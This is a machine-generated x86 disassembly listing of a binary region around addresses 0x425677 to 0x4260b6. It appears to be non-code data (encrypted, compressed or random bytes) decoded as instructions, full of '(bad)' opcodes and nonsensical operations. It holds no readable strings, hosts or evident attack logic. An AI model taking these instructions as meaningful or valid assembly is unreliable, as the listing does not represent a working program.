  425677:	div    BYTE PTR [edi]
  425679:	jle    0x425696
  42567b:	aad    0xc0
  42567d:	stos   BYTE PTR es:[edi],al
  42567e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42567f:	in     al,dx
  425680:	pop    eax
  425681:	daa    
  425682:	sahf   
  425683:	(bad)  
  425684:	out    dx,eax
  425685:	inc    edi
  425686:	cwde   
  425687:	jnp    0x4256f0
  425689:	xor    al,0xfb
  42568b:	sbb    esp,esp
  42568d:	test   ebp,edx
  42568f:	jle    0x4256e5
  425691:	sub    edx,edi
  425693:	add    bl,0x1a
  425696:	das    
  425697:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425698:	inc    ebp
  425699:	neg    BYTE PTR [esi+0x79]
  42569c:	aaa    
  42569d:	(bad)  
  42569e:	jecxz  0x4256e3
  4256a0:	adc    ebp,DWORD PTR [ebp-0x62]
  4256a3:	ss or  ah,0x36
  4256a7:	daa    
  4256a8:	scas   al,BYTE PTR es:[edi]
  4256a9:	aam    0xcb
  4256ab:	sbb    eax,0x3d5845bb
  4256b0:	adc    dh,BYTE PTR [ecx]
  4256b2:	push   esp
  4256b3:	es push cs
  4256b5:	scas   eax,DWORD PTR es:[edi]
  4256b6:	test   eax,0xa9198499
  4256bb:	(bad)  
  4256bc:	and    al,0xa0
  4256be:	call   0x6f148deb
  4256c3:	(bad)  
  4256c4:	std    
  4256c5:	mov    ah,0x61
  4256c7:	loop   0x4256cd
  4256c9:	sbb    bh,dl
  4256cb:	inc    edx
  4256cc:	mov    esi,0x36433727
  4256d1:	stos   BYTE PTR es:[edi],al
  4256d2:	push   ss
  4256d3:	inc    edx
  4256d4:	rcl    BYTE PTR [ecx+0xe6472bb],0x64
  4256db:	mov    ds:0x6f93942,al
  4256e0:	jo     0x425671
  4256e2:	sahf   
  4256e3:	aad    0x1e
  4256e5:	xchg   bl,ch
  4256e7:	pop    esi
  4256e8:	sub    ch,ah
  4256ea:	xchg   ebx,eax
  4256eb:	mov    DWORD PTR [edi+0x48f79ed8],eax
  4256f1:	sub    DWORD PTR [ebx-0x50a55de1],ecx
  4256f7:	jmp    0x4256b3
  4256f9:	jl     0x425716
  4256fb:	(bad)  
  4256fc:	stc    
  4256fd:	stc    
  4256fe:	repz (bad) 
  425700:	clc    
  425701:	cmp    DWORD PTR [ecx+0x7d57df26],edx
  425707:	lods   eax,DWORD PTR ds:[esi]
  425708:	sub    al,0x9c
  42570a:	iret   
  42570b:	test   DWORD PTR [esi+0x5c65f4],0x0
	...
  425771:	add    BYTE PTR [eax],al
  425773:	add    dh,dl
  425775:	aaa    
  425776:	shl    BYTE PTR [ebx+esi*8],cl
  425779:	cmc    
  42577a:	div    bh
  42577c:	test   DWORD PTR [edi+0x3f],0xc4b5d374
  425783:	cmp    eax,ecx
  425785:	pop    DWORD PTR [ecx]
  425787:	add    BYTE PTR [ecx+eax*1],al
  42578a:	add    BYTE PTR [eax],al
  42578c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42578d:	jnp    0x4257cf
  42578f:	adc    eax,0xc8ff3097
  425794:	or     al,BYTE PTR [edx+0x7d]
  425797:	loop   0x425720
  425799:	mov    bh,0xac
  42579b:	sbb    BYTE PTR [edx+0x7],ah
  42579e:	add    eax,0x4d5d77f
  4257a3:	imul   esi,DWORD PTR [ebx-0x2171b1a6],0x4d
  4257aa:	leave  
  4257ab:	test   eax,0x91738fad
  4257b0:	stos   DWORD PTR es:[edi],eax
  4257b1:	dec    edi
  4257b2:	shl    dh,cl
  4257b4:	sub    DWORD PTR [esi+0x434fbdbb],0x9
  4257bb:	sub    DWORD PTR [esi+0x384f04d4],eax
  4257c1:	ror    BYTE PTR [eax+0x2f82e027],0x94
  4257c8:	sahf   
  4257c9:	cmp    esp,edi
  4257cb:	cmc    
  4257cc:	sbb    al,0x39
  4257ce:	ja     0x42582e
  4257d0:	mov    ebx,0xce20d068
  4257d5:	(bad)  
  4257d6:	push   0xd2e78b46
  4257db:	addr16 nop
  4257dd:	jge    0x4257ee
  4257df:	and    BYTE PTR [ecx-0x416fb233],ah
  4257e5:	inc    edi
  4257e6:	jmp    0x73fc3f73
  4257eb:	lea    ecx,[ebp+0x60]
  4257ee:	lods   al,BYTE PTR ds:[esi]
  4257ef:	mov    ch,0xcd
  4257f2:	aaa    
  4257f3:	mov    edx,0x5e33cc5b
  4257f8:	retf   0x929f
  4257fb:	push   0xceb2cd6b
  425800:	daa    
  425801:	inc    eax
  425802:	call   0x48c63591
  425807:	xor    al,0xf4
  425809:	jp     0x425846
  42580b:	int    0x61
  42580d:	mov    al,ds:0xd5af548b
  425812:	or     ecx,DWORD PTR [ecx]
  425814:	mov    bh,0xd4
  425816:	out    dx,al
  425817:	adc    ecx,DWORD PTR [ebp-0x69b9c381]
  42581d:	pop    ss
  42581e:	xchg   edx,eax
  42581f:	enter  0x17b9,0x77
  425823:	les    esi,FWORD PTR [edi+0x54]
  425826:	dec    ebp
  425827:	pop    edi
  425828:	xor    ecx,DWORD PTR [ebx-0x18440c61]
  42582e:	outs   dx,DWORD PTR ds:[esi]
  42582f:	retf   0x585c
  425832:	add    DWORD PTR [eax],edi
  425834:	jge    0x42587d
  425836:	jp     0x4257ef
  425838:	shr    cl,0xa5
  42583b:	nop
  42583c:	leave  
  42583d:	dec    edi
  42583e:	int3   
  42583f:	mov    eax,0xbefee0b3
  425844:	pushf  
  425845:	sbb    DWORD PTR [eax],edx
  425847:	cmp    BYTE PTR [ecx-0x7d],0x2b
  42584b:	popa   
  42584c:	mov    al,0xe
  42584e:	inc    ecx
  42584f:	mov    ebp,0x3cf142fb
  425854:	push   edi
  425855:	imul   eax,DWORD PTR [edi],0x8
  425858:	es out 0x10,eax
  42585b:	xchg   esi,eax
  42585c:	repnz sbb eax,0x5610c344
  425862:	or     ebp,DWORD PTR [eax+0x2177a6d3]
  425868:	sahf   
  425869:	mov    ds:0xcdb3710d,eax
  42586e:	pop    ecx
  42586f:	mov    ecx,0xfe2dcb88
  425874:	sub    al,0x8f
  425876:	hlt    
  425877:	xchg   esp,eax
  425878:	dec    ebp
  425879:	and    DWORD PTR [edi-0x68fc91f4],edi
  42587f:	mov    dh,0x4c
  425881:	dec    ecx
  425882:	dec    ebp
  425883:	addr16 std 
  425885:	shl    DWORD PTR ds:0xe19a5ac9,1
  42588b:	add    DWORD PTR [eax],esp
  42588d:	dec    eax
  42588e:	mov    dl,BYTE PTR [ebx+0x0]
	...
  4258f1:	add    BYTE PTR [eax],al
  4258f3:	add    BYTE PTR [edx+edx*2-0x70],bl
  4258f7:	push   edx
  4258f8:	sahf   
  4258f9:	rcr    dh,cl
  4258fb:	pop    esi
  4258fc:	adc    BYTE PTR [edx+0x55],0x71
  425900:	pop    esp
  425901:	inc    edi
  425902:	dec    edi
  425903:	sbb    ecx,esp
  425905:	nop
  425906:	add    DWORD PTR [eax],eax
  425908:	add    al,0x1
  42590a:	add    BYTE PTR [eax],al
  42590c:	push   eax
  42590d:	dec    eax
  42590e:	mov    dh,0xa1
  425910:	mov    eax,ds:0x71351843
  425915:	jle    0x425906
  425917:	mov    al,0x71
  425919:	xchg   DWORD PTR [ebx],edi
  42591b:	sub    ch,BYTE PTR [eax-0x7a]
  42591e:	jns    0x425972
  425920:	(bad)  
  425922:	xchg   dl,dh
  425924:	xchg   esp,eax
  425925:	sub    DWORD PTR [ebp+0xb],edx
  425928:	clc    
  425929:	shr    al,1
  42592b:	pop    ebp
  42592c:	aad    0x3
  42592e:	mov    edi,0x14b5dac9
  425933:	pop    eax
  425934:	cli    
  425935:	xchg   ebp,eax
  425936:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425937:	daa    
  425938:	lea    edi,[ebp-0x3184cb35]
  42593e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42593f:	stos   BYTE PTR es:[edi],al
  425940:	rcr    BYTE PTR [edi+0x1f],cl
  425943:	mov    al,ds:0x563ec073
  425948:	shr    BYTE PTR [ecx+0x3],1
  42594b:	fucomi st,st(0)
  42594e:	shl    ebp,1
  425950:	bound  eax,QWORD PTR [ebx-0x3b]
  425953:	dec    esi
  425954:	adc    BYTE PTR [esi+0x1e],bh
  425957:	inc    ecx
  425958:	(bad)  
  425959:	add    ecx,esi
  42595b:	ds cld 
  42595d:	add    cl,dh
  42595f:	lods   eax,DWORD PTR ds:[esi]
  425960:	test   DWORD PTR [edx],0xd70a05f5
  425966:	adc    edi,ecx
  425968:	(bad)  [ecx]
  42596a:	push   es
  42596b:	pop    edx
  42596c:	ret    0x813d
  42596f:	mov    ebx,eax
  425971:	popf   
  425972:	inc    ebp
  425973:	xchg   edx,eax
  425974:	dec    esi
  425975:	xchg   ebx,eax
  425976:	aas    
  425977:	mov    eax,0xcbfc8f90
  42597c:	or     al,0x4a
  42597e:	mov    dh,0x24
  425980:	enter  0xfec1,0xed
  425984:	rol    DWORD PTR [edx-0x4f],0xde
  425988:	adc    esi,DWORD PTR [ebp+0x1b]
  42598b:	lds    ebp,FWORD PTR [edx-0x2af638c]
  425991:	popa   
  425992:	add    al,0x96
  425994:	inc    esi
  425995:	mov    cl,0xc1
  425997:	ret    
  425998:	out    dx,al
  425999:	pmullw mm7,QWORD PTR [ebp-0x42]
  42599d:	adc    esp,DWORD PTR [eax-0x73b66a3a]
  4259a3:	(bad)  
  4259a4:	(bad)  
  4259a5:	pop    es
  4259a6:	in     eax,dx
  4259a7:	shl    BYTE PTR [ebx-0x73acea01],0x90
  4259ae:	xchg   edx,eax
  4259af:	adc    esp,DWORD PTR [esi+0x5c608806]
  4259b5:	jmp    0x7a1b9ed3
  4259ba:	push   0xffffff8b
  4259bc:	ror    BYTE PTR [ebx+0x67],0xbb
  4259c0:	test   ch,bl
  4259c2:	add    ah,bl
  4259c4:	(bad)  
  4259c5:	loopne 0x4259c7
  4259c7:	out    dx,eax
  4259c8:	mov    ebp,0x77c314e6
  4259cd:	or     esp,0xc167dfb4
  4259d3:	in     eax,0x13
  4259d5:	xlat   BYTE PTR ds:[ebx]
  4259d6:	or     al,0x85
  4259d8:	push   0xf4a509d8
  4259dd:	out    dx,al
  4259de:	outs   dx,BYTE PTR ds:[esi]
  4259df:	mov    ch,0xd
  4259e1:	out    0xc,al
  4259e3:	sbb    al,0xb3
  4259e5:	mov    ds:0x49d5f4ed,eax
  4259ea:	push   ds
  4259eb:	and    DWORD PTR [ebp+ebx*8-0xc],0x7d610090
  4259f3:	lahf   
  4259f4:	jb     0x425a46
  4259f6:	(bad)  
  4259f7:	std    
  4259f8:	mov    ds:0x1d4bbe97,eax
  4259fd:	imul   edx,DWORD PTR [esi-0x70da1aa5],0x5
  425a04:	test   eax,0x97be9bc0
  425a09:	lods   eax,DWORD PTR ds:[esi]
  425a0a:	(bad)  
  425a0c:	jae    0x425a2b
  425a0e:	xchg   DWORD PTR [edi],ecx
	...
  425a74:	shl    DWORD PTR [ebx+0x4],0x67
  425a78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a79:	jcxz   0x425a63
  425a7c:	(bad)  
  425a7d:	fimul  DWORD PTR [edi+eax*4-0x2f2c3e3d]
  425a84:	rcl    BYTE PTR [ecx+0x1040001],1
  425a8a:	add    BYTE PTR [eax],al
  425a8c:	mov    al,0x29
  425a8e:	fidivr DWORD PTR [eax-0x2e]
  425a91:	and    BYTE PTR [edx-0x68],bh
  425a94:	mov    DWORD PTR [edi],edi
  425a96:	inc    ebx
  425a97:	cmp    ch,BYTE PTR [ebp-0x7a07c8df]
  425a9d:	sbb    bl,BYTE PTR [esi-0x7d986d21]
  425aa3:	leave  
  425aa4:	cmp    al,0x41
  425aa6:	out    dx,al
  425aa7:	jl     0x425aff
  425aa9:	inc    edx
  425aaa:	inc    esi
  425aab:	push   eax
  425aac:	ins    DWORD PTR es:[edi],dx
  425aad:	sar    BYTE PTR [esi+0x17880302],0x46
  425ab4:	outs   dx,DWORD PTR ds:[esi]
  425ab5:	push   ebp
  425ab6:	cdq    
  425ab7:	lahf   
  425ab8:	es rcr edi,cl
  425abb:	mov    al,0xe6
  425abd:	jmp    0x425a8a
  425abf:	lods   eax,DWORD PTR ds:[esi]
  425ac0:	push   ss
  425ac1:	mov    ebx,0xa11b2862
  425ac6:	ja     0x425b24
  425ac8:	lds    esp,FWORD PTR [edi+ebx*1+0x5b3816c0]
  425acf:	mov    eax,0x76697bbc
  425ad4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425ad5:	test   BYTE PTR [ebx],al
  425ad7:	shl    DWORD PTR ds:0xf50bd4c7,1
  425add:	popa   
  425ade:	rcr    DWORD PTR [ebx-0x2b],cl
  425ae1:	cwde   
  425ae2:	pop    eax
  425ae3:	js     0x425ab9
  425ae5:	jns    0x425ad4
  425ae7:	sub    BYTE PTR [edi],dh
  425ae9:	jae    0x425a7a
  425aeb:	call   0x91e1:0x4472d29e
  425af2:	les    eax,FWORD PTR [esi]
  425af4:	dec    ebx
  425af5:	or     al,0x1e
  425af7:	scas   al,BYTE PTR es:[edi]
  425af8:	sub    al,0xbd
  425afa:	lahf   
  425afb:	ins    BYTE PTR es:[edi],dx
  425afc:	xchg   ecx,eax
  425afd:	ins    DWORD PTR es:[edi],dx
  425afe:	jnp    0x425b07
  425b00:	or     al,0xef
  425b02:	mov    dl,0x58
  425b04:	in     al,dx
  425b05:	xchg   ecx,eax
  425b06:	add    DWORD PTR [esi-0x14],edi
  425b09:	addr16 jp 0x425b30
  425b0c:	inc    ebx
  425b0d:	fnsave [ebp+0x3624b2ac]
  425b13:	or     ecx,ebx
  425b15:	fsub   st(7),st
  425b17:	rol    BYTE PTR [edx-0x41fb3749],0xf
  425b1e:	mov    cl,BYTE PTR [edx+0x38]
  425b21:	aam    0x20
  425b23:	mov    ebp,DWORD PTR [ecx]
  425b25:	pop    ebx
  425b26:	jb     0x425b38
  425b28:	stos   BYTE PTR es:[edi],al
  425b29:	push   ebx
  425b2a:	test   BYTE PTR [ecx-0x14],dh
  425b2d:	mov    bh,0x86
  425b2f:	inc    ebp
  425b30:	add    bl,bl
  425b32:	outs   dx,DWORD PTR ds:[esi]
  425b33:	jb     0x425b81
  425b35:	add    BYTE PTR [ebx+0x1f39dee1],0x71
  425b3c:	push   esp
  425b3d:	jle    0x425ae2
  425b3f:	xor    BYTE PTR [edx],ah
  425b41:	fsubr  DWORD PTR [edi+0x7b7247f7]
  425b47:	sar    esp,cl
  425b49:	mov    bl,BYTE PTR [ecx+0x6f777027]
  425b4f:	mov    ebp,0xadc5c9b
  425b54:	xchg   esi,eax
  425b55:	add    al,0x54
  425b57:	mov    BYTE PTR [edx+0x25],dh
  425b5a:	pop    esp
  425b5b:	out    dx,eax
  425b5c:	scas   al,BYTE PTR es:[edi]
  425b5d:	add    al,0xdc
  425b5f:	fisttp WORD PTR ds:0xb187b81f
  425b65:	xchg   ecx,eax
  425b66:	cmp    DWORD PTR [ecx],ebx
  425b68:	or     BYTE PTR [ebp+0xc3b7542],dh
  425b6e:	(bad)  
  425b70:	(bad)  [eax+0x1b]
  425b73:	test   bh,dh
  425b75:	clc    
  425b76:	pop    esp
  425b77:	aad    0x29
  425b79:	mov    ebx,0x9d1ca6da
  425b7e:	mov    dl,0xa2
  425b80:	(bad)  
  425b81:	out    dx,al
  425b82:	or     bh,0xe7
  425b85:	test   al,0x48
  425b87:	or     al,0xca
  425b89:	call   esi
  425b8b:	jo     0x425b5f
  425b8d:	push   ds
  425b8e:	(bad)  
  425b8f:	clc    
	...
  425bf4:	(bad)  
  425bf5:	clc    
  425bf6:	jnp    0x425c4e
  425bf8:	jg     0x425bd1
  425bfa:	in     eax,dx
  425bfb:	cli    
  425bfc:	enter  0xe6cd,0x96
  425c00:	fidiv  DWORD PTR [ebx]
  425c02:	xchg   ecx,eax
  425c03:	not    ah
  425c05:	xchg   edx,eax
  425c06:	add    DWORD PTR [eax],eax
  425c08:	add    al,0x1
  425c0a:	add    BYTE PTR [eax],al
  425c0c:	stc    
  425c0d:	outs   dx,DWORD PTR ds:[esi]
  425c0e:	outs   dx,BYTE PTR ds:[esi]
  425c0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425c10:	outs   dx,DWORD PTR ds:[esi]
  425c11:	popa   
  425c12:	jo     0x425bb6
  425c14:	(bad)  
  425c15:	mov    ecx,DWORD PTR [edx]
  425c17:	sar    DWORD PTR [edx-0x44],1
  425c1a:	xchg   ebp,eax
  425c1b:	cmp    al,0xde
  425c1d:	popf   
  425c1e:	push   ss
  425c1f:	(bad)  [ebx-0x4b]
  425c22:	(bad)  
  425c23:	mov    esp,0xf067bd6c
  425c28:	pushf  
  425c29:	adc    edi,DWORD PTR ds:0xa842f506
  425c2f:	outs   dx,BYTE PTR ds:[esi]
  425c30:	xchg   edi,eax
  425c31:	sub    esp,DWORD PTR [edx]
  425c33:	pop    ebx
  425c34:	call   0x184c4cad
  425c39:	xchg   esp,eax
  425c3a:	daa    
  425c3b:	xor    bl,BYTE PTR [ecx+0x2368a080]
  425c41:	ret    0x7ebb
  425c44:	fwait
  425c45:	mov    bh,0xab
  425c47:	add    BYTE PTR [esi],ch
  425c49:	out    dx,al
  425c4a:	adc    DWORD PTR [ebp-0x67],edx
  425c4d:	add    al,0x3f
  425c4f:	pop    ds
  425c50:	dec    esi
  425c51:	dec    eax
  425c52:	mov    ebp,0x15cd7df7
  425c57:	sub    edx,DWORD PTR [esi]
  425c59:	fwait
  425c5a:	fwait
  425c5b:	mov    ch,0x2a
  425c5d:	pop    ss
  425c5e:	jecxz  0x425c59
  425c60:	aas    
  425c61:	addr16 mov dh,0xe4
  425c64:	lds    ebx,FWORD PTR [ebp+0x59]
  425c67:	sbb    al,0xcc
  425c69:	adc    al,0x89
  425c6b:	mov    ah,0x6f
  425c6d:	ja     0x425c20
  425c6f:	inc    ecx
  425c70:	(bad)  
  425c71:	mov    esp,0x3b4e2b67
  425c76:	(bad)  
  425c77:	adc    ebx,ebp
  425c79:	jle    0x425ce0
  425c7b:	cmp    ah,dh
  425c7d:	in     al,dx
  425c7e:	repz inc edx
  425c80:	push   ss
  425c81:	jl     0x425c70
  425c83:	cmp    bh,cl
  425c85:	sbb    BYTE PTR [ecx-0x46],al
  425c88:	ins    BYTE PTR es:[edi],dx
  425c89:	fsub   QWORD PTR [esi+0x1d47b3f1]
  425c8f:	sbb    al,0x84
  425c91:	push   edi
  425c92:	push   ebp
  425c93:	stc    
  425c94:	inc    ecx
  425c95:	mov    esp,DWORD PTR [edi]
  425c97:	adc    eax,0x1ba1dd91
  425c9c:	jbe    0x425cef
  425c9e:	popa   
  425c9f:	lods   eax,DWORD PTR ds:[esi]
  425ca0:	es psadbw mm0,mm0
  425ca4:	aas    
  425ca5:	(bad)  
  425ca6:	int    0xb3
  425ca8:	xor    eax,0x7bb8289d
  425cad:	mov    edx,0x7506f113
  425cb2:	sahf   
  425cb3:	fsubr  st(3),st
  425cb5:	adc    al,0xc4
  425cb7:	sub    eax,0x8a004872
  425cbc:	sub    DWORD PTR ds:0xd60528f9,0xffffffff
  425cc3:	loop   0x425c60
  425cc5:	lea    ecx,[esi]
  425cc7:	pusha  
  425cc8:	xchg   ebx,eax
  425cc9:	add    DWORD PTR [ebp+0x564b70fa],eax
  425ccf:	(bad)  
  425cd0:	jo     0x425c75
  425cd2:	rcr    eax,cl
  425cd4:	dec    ebx
  425cd5:	push   es
  425cd6:	nop
  425cd7:	sbb    al,al
  425cd9:	and    DWORD PTR [edi],esp
  425cdb:	or     cl,dl
  425cdd:	nop
  425cde:	pop    es
  425cdf:	mov    ah,0xe8
  425ce1:	leave  
  425ce2:	imul   ebx,DWORD PTR [ecx+edi*4-0x648604cc],0xffffffce
  425cea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425ceb:	jae    0x425cef
  425ced:	inc    ecx
  425cee:	ja     0x425cdc
  425cf0:	push   DWORD PTR [ebp-0x4a]
  425cf3:	fistp  DWORD PTR [edi+0xd14ac18]
  425cf9:	adc    eax,0x1051c3e1
  425cfe:	cld    
  425cff:	jg     0x425c87
  425d01:	call   0x552c:0x6d2392ad
  425d08:	cmc    
  425d09:	rcr    BYTE PTR [edi+eiz*8+0x57],cl
  425d0d:	daa    
  425d0e:	xor    DWORD PTR [edx],ebp
	...
  425d74:	jmp    FWORD PTR [esp+ebx*8-0x8820f9]
  425d7b:	cld    
  425d7c:	gs addr16 stc 
  425d7f:	mov    ds:0x19ee7164,al
  425d84:	fcom   DWORD PTR [ebx+0x1040001]
  425d8a:	add    BYTE PTR [eax],al
  425d8c:	(bad)
  425d8f:	and    BYTE PTR [esi],0xa9
  425d92:	push   0xfffffffc
  425d94:	inc    esi
  425d95:	adc    al,BYTE PTR fs:[ecx+0x647b9676]
  425d9c:	dec    DWORD PTR [edi]
  425d9e:	fcomp  QWORD PTR [ecx-0x37192bd3]
  425da4:	push   ecx
  425da5:	test   al,0xc4
  425da7:	mov    al,0xdd
  425da9:	pushf  
  425daa:	adc    eax,0xe90019f4
  425daf:	xlat   BYTE PTR ds:[ebx]
  425db0:	gs pop esp
  425db2:	cdq    
  425db3:	(bad)  
  425db4:	clc    
  425db5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425db6:	out    0x20,al
  425db8:	xchg   eax,esp
  425dba:	xchg   esp,eax
  425dbb:	cmp    eax,0x68f926a1
  425dc0:	xor    al,0xee
  425dc2:	add    al,0x6a
  425dc4:	std    
  425dc5:	(bad)  
  425dc6:	loopne 0x425d8e
  425dc8:	dec    esp
  425dc9:	ins    BYTE PTR es:[edi],dx
  425dca:	call   0x46bc:0xcd5e0fed
  425dd1:	aad    0xd5
  425dd3:	mov    ecx,0x17da4148
  425dd8:	xor    al,0x10
  425dda:	in     eax,dx
  425ddb:	jmp    0x425da9
  425ddd:	jl     0x425e22
  425ddf:	ret    
  425de0:	cmp    eax,0x20fdf932
  425de5:	nop
  425de6:	dec    ebx
  425de7:	scas   al,BYTE PTR es:[edi]
  425de8:	or     al,0x14
  425dea:	imul   eax,DWORD PTR [edi-0x3b],0xffffff8c
  425dee:	push   cs
  425def:	in     al,0xf
  425df1:	mov    bl,0x67
  425df3:	ret    0x190a
  425df6:	leave  
  425df7:	push   edx
  425df8:	in     eax,dx
  425df9:	xchg   edx,eax
  425dfa:	jae    0x425e67
  425dfc:	imul   edi,DWORD PTR [ecx+0x4d1c5207],0x2cb17c8a
  425e06:	sub    edi,DWORD PTR [ebp-0x67bebbf7]
  425e0c:	and    esi,0x1f
  425e0f:	fwait
  425e10:	xchg   edi,eax
  425e11:	cmc    
  425e12:	jnp    0x425e58
  425e14:	pushf  
  425e15:	(bad)  
  425e17:	mov    al,ds:0xffc7e6c8
  425e1c:	inc    esp
  425e1d:	mov    dh,0xdd
  425e1f:	push   ds
  425e20:	xor    BYTE PTR [edx+0x2195e112],al
  425e26:	loope  0x425e7c
  425e28:	and    al,BYTE PTR [edx-0x48d9263d]
  425e2e:	sub    ebp,ecx
  425e30:	pushf  
  425e31:	sti    
  425e32:	pop    esi
  425e33:	aad    0x44
  425e35:	cmp    esi,0xbba12a5e
  425e3b:	push   ss
  425e3c:	mov    bh,0x52
  425e3e:	fstp   TBYTE PTR [eax+0x6eb3bebd]
  425e44:	dec    eax
  425e45:	push   DWORD PTR [ebx]
  425e47:	pushf  
  425e48:	fnsave [eax]
  425e4a:	bound  esp,QWORD PTR [ecx-0x27]
  425e4d:	jno    0x425e74
  425e4f:	das    
  425e50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425e51:	rol    BYTE PTR [edx-0x61],1
  425e54:	push   cs
  425e55:	mov    ebp,0xafd46d56
  425e5a:	out    dx,eax
  425e5b:	jg     0x425e9d
  425e5d:	dec    eax
  425e5e:	sub    BYTE PTR [edi+0x47],dh
  425e61:	je     0x425ed7
  425e63:	iret   
  425e64:	mov    ebx,0xa6710c2f
  425e69:	push   0xaafcfe4a
  425e6e:	jns    0x425e5b
  425e70:	and    BYTE PTR [eax],dh
  425e72:	out    dx,al
  425e73:	mov    al,0xf8
  425e75:	or     al,0x92
  425e77:	mov    edi,0x5d1ef6e4
  425e7c:	sub    al,0xc3
  425e7e:	hlt    
  425e7f:	sahf   
  425e80:	pop    esp
  425e81:	(bad)  
  425e83:	push   ebp
  425e84:	mov    ch,0x76
  425e86:	cdq    
  425e87:	inc    eax
  425e88:	jae    0x425eb1
  425e8a:	std    
  425e8b:	pop    esp
  425e8c:	inc    edx
  425e8d:	inc    ebp
  425e8e:	jl     0x425eb2
	...
  425ef4:	(bad)  
  425ef5:	jl     0x425f48
  425ef7:	sar    bl,1
  425ef9:	std    
  425efa:	(bad)  
  425efb:	jle    0x425ec9
  425efd:	pop    ss
  425efe:	popf   
  425eff:	scas   eax,DWORD PTR es:[edi]
  425f00:	sub    al,0xf5
  425f02:	fwait
  425f03:	inc    ecx
  425f04:	fcom   QWORD PTR [ecx+eax*1+0x10400]
  425f0b:	add    BYTE PTR [edx-0xe1000a5],bh
  425f11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425f12:	dec    edx
  425f13:	retf   
  425f14:	pop    es
  425f15:	jmp    0x425f24
  425f17:	cmp    ecx,esi
  425f19:	popa   
  425f1a:	adc    DWORD PTR [edx],esi
  425f1c:	out    0x8c,al
  425f1e:	and    BYTE PTR [edx+0x6a7f070a],ah
  425f24:	iret   
  425f25:	dec    ebx
  425f26:	adc    esi,eax
  425f28:	dec    edi
  425f29:	jecxz  0x425f4a
  425f2b:	in     eax,dx
  425f2c:	inc    esi
  425f2d:	test   DWORD PTR [edi-0x1a132fbe],ebp
  425f33:	fsub   DWORD PTR [edx+0x4d8bdd83]
  425f39:	inc    ecx
  425f3a:	sbb    DWORD PTR [ecx],edx
  425f3c:	sahf   
  425f3d:	mov    edi,0xc7e45359
  425f42:	and    ah,BYTE PTR [ebx-0x12]
  425f45:	mov    esi,0x71f6fda0
  425f4a:	mov    ds:0xc7305a3e,eax
  425f4f:	or     cl,BYTE PTR [ecx]
  425f51:	cld    
  425f52:	into   
  425f53:	out    dx,al
  425f54:	ror    DWORD PTR [esi],0x76
  425f57:	out    0xef,al
  425f59:	mov    al,0xe6
  425f5b:	jo     0x425f89
  425f5d:	adc    DWORD PTR [bx],esp
  425f60:	fisttp WORD PTR [edi+0x6fcd5faf]
  425f66:	sub    dl,BYTE PTR [ebp-0x14]
  425f69:	sbb    dl,0x92
  425f6c:	jg     0x425f2b
  425f6e:	jnp    0x425fe7
  425f70:	int    0x49
  425f72:	xor    dl,BYTE PTR [ebx-0xed9b821]
  425f78:	shr    DWORD PTR [esi],1
  425f7a:	cmp    bl,BYTE PTR [ecx+0x224bc573]
  425f80:	call   0xb7c973ce
  425f85:	cmc    
  425f86:	xor    DWORD PTR [ebp+0x6e],0xffffffa4
  425f8a:	sar    BYTE PTR [edi+0x3c],0x80
  425f8e:	push   0xffffffc2
  425f90:	fistp  DWORD PTR [ebp-0x5978e517]
  425f96:	mov    ecx,0xc2469f12
  425f9c:	jl     0x425f85
  425f9e:	sbb    ebp,DWORD PTR [ecx+0x1e]
  425fa1:	mov    ds:0xdfee5be,eax
  425fa6:	daa    
  425fa7:	mov    edx,0x4997433a
  425fac:	das    
  425fad:	popf   
  425fae:	and    DWORD PTR [esi],0xa8473173
  425fb4:	dec    esp
  425fb5:	inc    esi
  425fb6:	cwde   
  425fb7:	push   esi
  425fb8:	dec    ecx
  425fb9:	xchg   ebp,eax
  425fba:	or     BYTE PTR ds:0x70d41185,cl
  425fc0:	fdivr  st,st(3)
  425fc2:	loopne 0x42601d
  425fc4:	mov    edi,0xba184464
  425fc9:	xchg   esp,eax
  425fca:	js     0x425fcf
  425fcc:	inc    eax
  425fcd:	bound  esp,QWORD PTR [edx-0x6065abad]
  425fd3:	mov    ?,WORD PTR [ebx-0x302bbfaa]
  425fd9:	aad    0x5b
  425fdb:	mov    ds:0xd8e8ef1c,al
  425fe0:	mov    ds:0x33a54fc7,al
  425fe5:	icebp  
  425fe6:	xchg   esi,eax
  425fe7:	mov    DWORD PTR [edi],esi
  425fe9:	pop    ebp
  425fea:	sbb    eax,0x3a662f3
  425fef:	or     BYTE PTR [edx],ch
  425ff1:	(bad)  
  425ff3:	xchg   esi,eax
  425ff4:	dec    ebp
  425ff5:	icebp  
  425ff6:	mov    eax,ds:0x17529238
  425ffb:	push   edx
  425ffc:	xor    eax,0xf4df62e6
  426001:	pop    edx
  426002:	or     dl,dl
  426004:	jo     0x425fc9
  426006:	arpl   WORD PTR [ebx-0x36],bp
  426009:	add    eax,0xa5d20389
  42600e:	mov    ecx,0x46
	...
  426073:	add    BYTE PTR [ecx],bh
  426075:	cwde   
  426076:	or     eax,DWORD PTR [esi]
  426078:	stos   DWORD PTR es:[edi],eax
  426079:	xchg   edi,eax
  42607a:	cmp    eax,0x304575bf
  42607f:	in     al,dx
  426080:	clc    
  426081:	mov    BYTE PTR [eax+0x67],dl
  426084:	loopne 0x42601b
  426086:	add    DWORD PTR [eax],eax
  426088:	add    al,0x1
  42608a:	add    BYTE PTR [eax],al
  42608c:	sub    al,BYTE PTR [ebx+0x50023757]
  426092:	je     0x4260eb
  426094:	push   ss
  426095:	nop
  426096:	cld    
  426097:	inc    eax
  426098:	scas   eax,DWORD PTR es:[edi]
  426099:	bound  eax,QWORD PTR ds:0x94f6a087
  42609f:	or     eax,0x15e67c2b
  4260a4:	mov    esp,0x8e258e3e
  4260a9:	fcomp  DWORD PTR [esi+0x56669804]
  4260af:	xor    BYTE PTR [ecx],al
  4260b1:	js     0x4260ef
  4260b3:	push   edi
  4260b4:	jg     0x4260fa
  4260b6:	mov    ecx,0x4946d04b
